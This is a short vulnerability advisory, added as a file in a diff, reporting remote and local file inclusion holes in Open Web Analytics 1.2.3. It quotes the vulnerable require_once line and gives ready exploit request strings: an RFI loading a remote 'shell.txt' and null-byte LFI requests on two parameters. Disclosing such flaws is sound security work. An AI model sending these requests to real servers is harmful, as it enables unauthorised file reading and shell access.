@@ -1,0 +1,25 @@
+===========================================================================
+( #Topic    : Open Web Analytics 1.2.3
+( #Bug type : multi file include
+( #Download : http://downloads.openwebanalytics.com/owa/owa_1_2_3.tar
+( #Advisory : 
+===========================================================================
+( #Author : ItSecTeam
+( #Email  : Bug@ITSecTeam.com
+( #Website: http://www.itsecteam.com
+( #Forum  : http://forum.ITSecTeam.com
+( #Original Advisory: www.ITSecTeam.com/en/vulnerabilities/vulnerability26.htm
+( #Special Tnx : ahmadbady , M3hr@n.S And All Team Members!
+
+vuls:===================================================================
+path/mw_plugin.php
+
+require_once "$IP/includes/SpecialPage.php";   
+
+exploit:===================================================================
+
+rfi : path/mw_plugin.php?IP=shell.txt?
+
+lfi :path/index.php?owa_action=[lfi]%00
+lfi :path/index.php?owa_do=[lfi]%00
+--------------------------------------
